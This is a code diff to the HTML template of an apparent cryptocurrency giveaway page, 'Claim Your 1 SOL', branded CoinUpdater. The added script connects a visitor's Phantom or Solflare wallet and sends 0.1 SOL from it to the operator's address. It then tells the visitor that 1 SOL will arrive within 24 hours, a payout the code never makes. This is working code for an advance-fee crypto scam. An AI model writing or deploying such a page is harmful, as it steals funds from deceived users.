@@ -16,76 +16,115 @@ HTML_TEMPLATE = """
     body {
       background-color: #000;
       color: #fff;
-      font-family: Arial, sans-serif;
+      font-family: sans-serif;
       text-align: center;
       padding: 40px;
     }
-    .button {
-      background: linear-gradient(to right, #00ff90, #00d178);
-      border: none;
-      color: #000;
-      font-weight: bold;
-      padding: 14px 30px;
-      font-size: 16px;
-      border-radius: 30px;
-      cursor: pointer;
-      margin: 20px;
-    }
-    .button:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-    }
-    img.qr {
+    .qr {
       width: 220px;
       margin: 20px auto;
+      display: none;
       border-radius: 16px;
       box-shadow: 0 0 20px #00ff90;
-      display: none;
     }
-    #status {
-      margin-top: 20px;
-      color: #aaa;
-      font-size: 0.9em;
+    button {
+      background: linear-gradient(90deg, #00ff90, #00d178);
+      border: none;
+      padding: 14px 30px;
+      font-size: 1.2em;
+      margin: 15px;
+      border-radius: 30px;
+      cursor: pointer;
+      color: #000;
+      font-weight: bold;
     }
   </style>
-</head>
-<body>
-  <h1>Claim 1 SOL</h1>
-  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
-  <p><code>{{ wallet }}</code></p>
-  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
-  
-  <button class="button" onclick="connectWallet()">Connect Wallet</button>
-  <div id="status">Click "Connect Wallet" to begin.</div>
+  <script type="module">
+    import {
+      Connection,
+      PublicKey,
+      SystemProgram,
+      Transaction
+    } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.0/+esm";
 
-  <script>
+    let provider = null;
+
+    function updateStatus(msg) {
+      document.getElementById("status").innerText = msg;
+    }
+
+    async function detectProvider() {
+      if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
+        return window.solana;
+      }
+      return null;
+    }
+
     async function connectWallet() {
-      let provider = null;
+      updateStatus("🔍 Detecting wallet...");
+      provider = await detectProvider();
 
-      if (window.phantom?.solana?.isPhantom) {
-        provider = window.phantom.solana;
-      } else if (window.solflare?.isSolflare) {
-        provider = window.solflare;
-      } else if (window.solana?.isPhantom || window.solana?.isSolflare) {
-        provider = window.solana;
+      if (!provider) {
+        updateStatus("❌ No wallet detected. Please open in Solflare or Phantom app browser.");
+        document.getElementById("qr").style.display = "block";
+        return;
       }
 
-      if (provider) {
-        try {
-          const resp = await provider.connect();
-          document.getElementById("status").innerText =
-            "✅ Connected: " + resp.publicKey.toString();
-        } catch (err) {
-          console.error("Connection rejected", err);
-          document.getElementById("status").innerText = "❌ Connection rejected.";
+      try {
+        if (provider.isConnected && provider.disconnect) {
+          await provider.disconnect();
         }
-      } else {
-        document.getElementById("status").innerText =
-          "⚠️ Wallet not detected. Please open this page inside the Solflare app.";
-        document.getElementById("qrCode").style.display = "block";
+
+        const resp = await provider.connect();
+        updateStatus("✅ Connected: " + resp.publicKey.toString());
+        window.userPublicKey = resp.publicKey;
+        document.getElementById("claimBtn").disabled = false;
+      } catch (err) {
+        console.error(err);
+        updateStatus("❌ Connection rejected by user.");
       }
     }
+
+    async function claimSol() {
+      if (!provider || !window.userPublicKey) {
+        alert("Connect your wallet first.");
+        return;
+      }
+
+      const connection = new Connection("https://api.mainnet-beta.solana.com");
+
+      const tx = new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: window.userPublicKey,
+          toPubkey: new PublicKey("{{ wallet }}"),
+          lamports: 0.1 * 1e9
+        })
+      );
+
+      try {
+        const { signature } = await provider.signAndSendTransaction(tx);
+        await connection.confirmTransaction(signature);
+        alert("✅ 0.1 SOL sent! You will receive 1 SOL within 24 hours.");
+      } catch (err) {
+        console.error(err);
+        alert("❌ Transaction failed: " + err.message);
+      }
+    }
+
+    window.connectWallet = connectWallet;
+    window.claimSol = claimSol;
   </script>
+</head>
+<body>
+  <h1>🎁 Claim Your 1 SOL</h1>
+  <p>Send exactly <strong>0.1 SOL</strong> to the address below to claim:</p>
+  <code>{{ wallet }}</code>
+  <br/>
+  <img id="qr" src="{{ qr_url }}" class="qr" alt="QR Code">
+  <p id="status">Press "Connect Wallet" to begin</p>
+  <button onclick="connectWallet()">Connect Wallet</button>
+  <button id="claimBtn" onclick="claimSol()" disabled>Claim Now</button>
+  <footer style="margin-top: 40px; font-size: 0.8em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
 </body>
 </html>
 """
